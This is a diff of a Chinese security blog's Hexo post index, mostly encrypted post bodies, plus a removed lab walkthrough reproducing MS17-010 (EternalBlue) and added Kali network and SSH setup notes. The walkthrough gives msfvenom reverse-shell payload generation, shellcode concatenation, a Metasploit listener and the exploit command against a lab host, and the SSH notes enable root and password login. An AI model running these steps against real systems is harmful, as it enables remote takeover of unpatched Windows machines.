Su6tyBGnCASdmkW8pMP+fa1XurUuB7mBG1DrEqzb3k5nvV3zxuecMWjHtVMkxFCLeuyr3LjojIWwOGS5qCxuCyG33kZ2dwRRy9vOLMExp0hY/tX85lexGFIG11UH+VnTkEzXpYzVVOrQ7PHG+rAO6PgyPKBBHkuE3K0jww6lDHCWY0YDDiRPWd9uITEqN5WiUU96xVkYLfoQCFM75tZcKEfsLVNWZUO6QgzsuB49SZxJfoYLbyJU5HroDswZja/mK7RwF7KaUExp8eyN9wnfw+ZO2kJHRbSj0QB4ymOckPSRLbxNSP/2IZTHjTZCfVvG5bYzs88/8mR+WZXZ3MbjzFUA9otoBTJi8LEdc0MQk6Xu+HJkw2s/QU3+dHwuSVBoTK1//O4Sz/Vmq4Y7l0jZjGVIMr/dwgvwTxhzMN5YPDgp7lZnvzifPXvKiXs98KnR4baV13wm6+PVvGtefDuPbztJMsP+1tHT5+dHq8g3r/wT8YSdi+n14oNcXlYTcRnITVpRaoU6v38fYWhFys5J8UMyT3erJwWova3MOhezCOzZKztXCRQeSZjDr+YNsU87zxaexwbuJ2V47Ii46fQhkkAnAUTMBwrzn9FZpPz8QOEk6leHRgCxiC </div>]]></content>
-      <categories>
-        <category>杂记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
-<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
-<p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
-<p>关闭靶机防火墙</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
-<p>在window server 2012中启动Guest账号</p>
-<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
-<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
-<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
-<p>下载到kali后后使用NASM工具对asm代码编译</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nasm -f bin eternalblue_kshellcode_x64.asm</span><br></pre></td></tr></table></figure>
-<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp -f raw -o reverse_shell.bin EXITFUNC&#x3D;thread LHOST&#x3D;192.168.233.128 LPORT&#x3D;9090</span><br></pre></td></tr></table></figure>
-<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin</span><br></pre></td></tr></table></figure>
-<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.233.128</span><br><span class="line">set LPORT 9090</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
-<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
-<p>保存退出，然后运行该脚本</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
-<p>运行成功，此时返回msf命令行</p>
-<p><img src="/2020/07/18/%E6%B8%97%E9%80%8F/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
-<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>At the very beginning...</title>
-    <url>/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/</url>
-    <content><![CDATA[<p><img src="/2020/04/06/%E6%9D%82%E8%AE%B0/Beginning/h2USniLgmurJKMe.png" alt></p>
-<h2 id="为什么写博客"><a class="header-anchor" href="#为什么写博客"></a>为什么写博客</h2>
-<p>0.有自己的博客听起来更屌一点。</p>
-<p>1.记录和分享一些学到的东西。</p>
-<p>2.倒逼自己去学一些新东西。</p>
-<h2 id="关于我"><a class="header-anchor" href="#关于我"></a>关于我</h2>
-<p>信息安全菜鸡</p>
-<p>偶尔打打ctf找虐</p>
-<p>业余爱好拳击，徒步</p>
-<p>QQ：MTc1NTkzNjEyOQ</p>
-<p>欢迎交流 ~</p>
-]]></content>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
       <categories>
         <category>杂记</category>
       </categories>
@@ -412,26 +371,62 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo博客搭建</title>
-    <url>/2020/04/07/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="安装配置-node-js"><a class="header-anchor" href="#安装配置-node-js"></a>安装配置 node.js</h2>
-<p><a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
-<p><strong>npm to cnpm</strong></p>
-<p><a href="https://www.jianshu.com/p/115594f64b41">https://www.jianshu.com/p/115594f64b41</a></p>
-<h2 id="安装配置-Git"><a class="header-anchor" href="#安装配置-Git"></a>安装配置 Git</h2>
-<p><a href="https://blog.csdn.net/qq_29726869/article/details/88622840">https://blog.csdn.net/qq_29726869/article/details/88622840</a></p>
-<p>安装完成即可，没有必要配置ssh</p>
-<h2 id="安装-hexo"><a class="header-anchor" href="#安装-hexo"></a>安装 hexo</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install -g hexo</span><br></pre></td></tr></table></figure>
-<p>建一个博客根目录，以管理员身份运行powershell并cd到博客根目录</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure>
+    <title>kali(Debian)虚拟机的网络配置</title>
+    <url>/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="网卡配置"><a class="header-anchor" href="#网卡配置"></a>网卡配置</h2>
+<p>首先将虚拟机设置中的网络连接设置为<strong>桥接模式</strong>，这样虚拟网卡直接和宿主机的物理网卡桥接，这个虚拟机就可以视为和宿主机在同一局域网中（双绞线连接），方便将来的测试。</p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/设置桥接模式.jpg" style="zoom:67%;">
+<p>然后打开虚拟网络编辑器，点击右下方的<strong>更改设置</strong></p>
+<img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/虚拟网络编辑器.jpg" style="zoom:67%;">
+<p>将红框部分改为你的物理网卡名称（可以在网络和共享中心-更改网络适配器中查看），如果找不到的话也可以保留<strong>自动</strong>选项，只不过这样的话后面如果把ip设置成静态的可能无法ping通外网。</p>
+<p>接下来进入虚拟机，<code>ifconfig</code>  查看IP地址，子网掩码，网关</p>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ifconfig.jpg" alt></p>
+<p>然后配置网卡eth0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;network&#x2F;interfaces</span><br></pre></td></tr></table></figure>
+<p>若要设置IP为静态的，则插入以下几行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0 #开机启动网卡</span><br><span class="line">iface eth0 inet static</span><br><span class="line">	address 192.168.xxx.xxx #上面查看的IP地址</span><br><span class="line">	broadcast 192.168.xxx.xxx #上面查看的网关地址</span><br><span class="line">	netmask 255.255.255.0</span><br></pre></td></tr></table></figure>
+<p>若设置为动态分配IP，则改为插入以下两行，这样设置重启后IP地址改变，需要自己注意</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>
+<p><code>:wq</code>保存退出之后，重启网卡</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service networking restart</span><br></pre></td></tr></table></figure>
+<p>然后<code>ping www.baidu.com</code>测试是否正常连接，再ping一下主机ip看是否成功。</p>
+<p>若主机能够ping通虚拟机，而虚拟机ping不通主机，则可能是被主机的防火墙拦截了，具体可以查看https://blog.csdn.net/hskw444273663/article/details/81301470</p>
+<p>到这里，主机和虚拟机能互相ping通，则网卡设置完成☺️</p>
+<h2 id="SSH配置"><a class="header-anchor" href="#SSH配置"></a>SSH配置</h2>
+<p>一般来说，kali默认已经安装了SSH</p>
+<p>首先查看SSH状态</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -e|grep ssh</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/23/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali(Debian)%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/ssh%E7%8A%B6%E6%80%81.jpg" alt></p>
+<p>如图所示，表示ssh服务已启动，若没有，则尝试手动启动</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>
+<p>然后修改sshd_config</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure>
+<p>找到<code>#PasswordAuthentication no</code>,把注释去掉，再把no改成yes</p>
+<p>找到<code>#PermitRootLogin yes</code>,去掉注释</p>
+<p>保存退出。</p>
+<p>重启SSH服务</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service ssh restart</span><br></pre></td></tr></table></figure>
